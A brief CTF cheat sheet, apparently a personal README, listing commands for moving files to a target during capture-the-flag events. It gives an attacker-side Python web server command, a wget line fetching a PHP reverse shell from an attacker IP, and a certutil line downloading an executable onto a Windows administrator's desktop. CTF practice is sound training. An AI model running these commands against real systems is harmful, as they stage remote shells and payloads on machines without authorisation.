# CTF-cheat-sheet
Some useful commands I use when participating in CTF events.

File transfer using SimpleHTTPServer - a Pyhton webserver

To start the webserver on the attacking machine "sudo python -m SimpleHTTPServer 80"

To download the file on a Unix machine "wget http://10.10.10.10/php-reverse-shell.php"

To download the file on a Windows machine "certutil -urlcache -f httP://10.10.14.9/sh.exe C:\users\administrator\desktop\flags\sh.exe"

